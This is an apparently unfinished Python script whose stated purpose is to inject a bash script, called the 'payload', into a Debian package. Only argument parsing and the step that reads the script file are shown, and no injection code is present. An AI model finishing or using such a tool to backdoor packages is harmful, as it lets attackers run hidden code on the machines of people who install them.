#!/usr/bin/python3

'''
Tool Name ::
Author :: Padsala Trushal #changing this line doesn't make you developer
Date :: 24 Oct 2021
'''

import os
import argparse
import sys


def get_arguments():
	parser = argparse.ArgumentParser(description='Inject bash script in debian package',usage=f'python3 {sys.argv[0]} -p debian_package -s bash_script',epilog=f'EXAMPLE - python3 {sys.argv[0]} -p /tmp/file.deb -s /tmp/script.sh')

	parser.add_argument('-v','--version',action='version',version='1.4',help='show the version of program')

	parser.add_argument('-s',metavar='bash script',dest='bash',help='Enter your bash script path')


	parser.add_argument('-p',metavar='debian package',dest='deb',help='Enter your debian package path')

	args = parser.parse_args()

	if len(sys.argv) < 2:
		parser.print_usage()
		sys.exit(1)
		
	return args

args = get_arguments()


deb = args.deb
bash = args.bash

if not os.path.exists(deb) or not os.path.exists(bash):
    print("[+] File Does Not Exists")
    sys.exit()


def read_content(script: str):
    file = open(script, 'r')
    content = file.read()
    file.close()
    return content

payload = read_content(bash)













